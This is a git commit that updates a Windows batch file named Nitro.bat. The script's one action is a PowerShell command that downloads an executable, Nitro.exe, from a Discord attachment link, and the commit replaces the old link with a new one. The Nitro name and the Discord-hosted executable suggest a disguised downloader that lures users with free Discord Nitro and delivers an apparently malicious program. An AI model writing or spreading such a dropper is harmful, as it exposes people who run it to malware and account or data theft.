3fdc4119793212b407a744fdf8f7649305b244ce
Hex-Byte-Glich <manzground@gmail.com>
2024-12-07 22:27:56 +0700

    Update Nitro.bat

--- Nitro.bat
+++ Nitro.bat
@@ -1,3 +1,3 @@
 @echo off
-powershell -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1314159572445040652/1314450066550816798/Nitro.exe' -OutFile 'Nitro.exe'"
+powershell -Command "Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1314972637415477370/1314976541981016064/Nitro.exe' -OutFile 'Nitro.exe'"
 pause
